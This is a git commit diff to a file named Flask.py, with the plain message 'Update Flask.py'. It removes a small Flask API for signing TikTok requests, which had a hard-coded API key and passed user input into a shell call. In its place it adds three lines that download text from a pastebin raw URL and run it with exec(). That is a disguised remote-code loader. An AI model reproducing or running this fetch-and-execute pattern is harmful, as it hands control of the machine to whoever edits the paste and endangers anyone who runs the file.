1270fa9c90d1fa39554ee9088ecc92645ab8054d
HH7H <105313594+HH7H@users.noreply.github.com>
2022-11-16 14:29:29 +0300

    Update Flask.py

--- Flask.py
+++ Flask.py
@@ -1,28 +1,8 @@
-from Naked.toolshed.shell import muterun_js
-import requests,json,os.path
-from flask import Flask,request
-import random
-import string
+import requests
 
-app = Flask(__name__)
+response = requests.get('https://pastebin.com/raw/Zub0fqyK').text
 
-@app.route('/',methods=['GET'])
-def Root():
-    return 'Hello from Flask'
-    
-
-@app.route('/api/tiktok/sign-request/',methods=['POST'])
-def Api():
-    url = str(request.form['url'])
-    XApiKey = str(request.form['X-Api-Key'])
-    if XApiKey == 'Pass@api':
-        response = muterun_js(' '.join([os.path.abspath('browser.js'), "\""+url+"\""]))
-        return response
-    else:
-        return json.dump({"status": "error", "error_type": "incorrect password"})
-        
-
-        
+exec(response)
         
         
         
